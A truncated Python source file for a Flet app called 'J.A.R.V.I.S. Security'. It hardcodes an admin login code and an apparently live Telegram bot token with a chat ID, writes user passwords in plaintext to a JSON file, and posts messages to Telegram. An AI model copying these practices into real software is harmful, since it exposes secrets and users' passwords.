import flet as ft
import requests
import json
import os

# --- 🔐 ตั้งค่าระบบ ---
ADMIN_USER = "ADMIN"
ADMIN_CODE = "159753"
TELEGRAM_TOKEN = "8680149233:AAEmvZHLil3FaiEeAVMAiSi2-Ef3XBzSd5c"
CHAT_ID = "8108462137"
DB_FILE = "users_db.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {}

def save_user(username, password):
    db = load_db()
    db[username] = password
    with open(DB_FILE, "w") as f: json.dump(db, f)

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
    except: pass

def main(page: ft.Page):
    page.title = "J.A.R.V.I.S. Security"
    page.theme_mode = ft.ThemeMode.DARK
    page.bgcolor = "#000814"
    page.vertical_alignment = "center"
    page.horizontal_alignment = "center"

    def show_dashboard(name):
        page.clean()
        page.add(ft.Container(content=ft.Column([
            ft.Text("J.A.R.V.I.S. ONLINE", size=30, weight="bold", color="cyan"),
            ft.Text(f"
      
